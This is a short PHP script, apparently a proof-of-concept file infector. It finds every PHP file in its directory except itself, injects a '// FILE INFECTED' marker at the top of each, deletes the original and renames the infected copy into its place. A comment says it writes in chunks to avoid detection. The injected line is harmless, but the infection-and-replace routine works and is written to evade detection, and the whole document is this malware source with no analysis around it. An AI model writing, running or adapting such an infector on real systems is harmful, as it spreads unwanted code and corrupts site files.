<?php

// Get a list of all PHP files 
$filenames = glob('*.php');

// check each file
foreach( $filenames as $filename) {
    if($filename == "boom.php")
        continue;
	// open file
	$script = fopen($filename,'r');

	//let's write to a new file, one chunck at a time, instead of reading whole file 
	// to void detection
	$infected = fopen("$filename.infected","w");
	$infection = '<?php // FILE INFECTED ?>';

	fputs($infected, $infection, strlen($infection));

	while( $contents = fgets($script) ) {
		fputs($infected, $contents, strlen($contents));
	}

	//close both handles and replance filename with infected file
	fclose($script);
	fclose($infected);
	// delete the original file
	unlink("$filename");
	rename("$filename.infected",$filename);	

}

?>
